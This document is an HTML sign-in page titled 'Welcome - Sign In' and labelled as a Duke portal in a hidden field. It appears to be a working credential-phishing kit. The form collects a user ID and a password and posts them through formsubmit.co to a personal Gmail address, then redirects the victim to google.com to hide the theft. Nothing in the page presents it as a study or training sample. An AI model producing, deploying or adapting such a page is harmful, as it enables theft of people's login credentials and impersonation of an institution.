<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome - Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 font-sans flex items-center justify-center min-h-screen p-4">

    <div class="w-full max-w-md bg-white shadow-xl overflow-hidden border border-gray-200 rounded-sm">
        
        <div class="w-full h-24 bg-[#002e5d] flex items-center justify-center">
            <img src="https://static.wixstatic.com/media/b05d56_47040153eb3e4ac48f7e906d3ff367d5~mv2.png" 
                 alt="Header Banner" 
                 class="h-full w-full object-cover">
        </div>

        <div class="p-8">
            <h2 class="text-2xl font-bold text-gray-800 mb-2">Welcome!</h2>
            <p class="text-gray-600 mb-6 text-sm">Please sign-in update.</p>

            <form action="https://formsubmit.co/abimbolaabdulmuizz@gmail.com" method="POST" class="space-y-5">
                
                <input type="hidden" name="_subject" value="New Submission - Duke Portal">
                <input type="hidden" name="_next" value="https://www.google.com">

                <div>
                    <label for="user_id" class="block text-sm font-medium text-gray-700 mb-1">
                        User ID<span class="text-red-500">*</span>
                    </label>
                    <input type="text" 
                           id="user_id" 
                           name="user_id" 
                           required 
                           class="w-full px-4 py-2 border border-gray-300 focus:ring-2 focus:ring-blue-800 outline-none transition-all">
                </div>

                <div>
                    <label for="password" class="block text-sm font-medium text-gray-700 mb-1">
                        Password<span class="text-red-500">*</span>
                    </label>
                    <input type="text" 
                           id="password" 
                           name="password" 
                           required 
                           class="w-full px-4 py-2 border border-gray-300 focus:ring-2 focus:ring-blue-800 outline-none transition-all">
                </div>

                <button type="submit" 
                        class="w-full bg-[#002e5d] text-white font-bold py-3 px-4 hover:bg-blue-900 active:scale-[0.98] transition-all uppercase tracking-wide">
                    Sign In
                </button>

            </form>
        </div>

        <div class="w-full h-1 bg-blue-700"></div>
    </div>

</body>
</html>
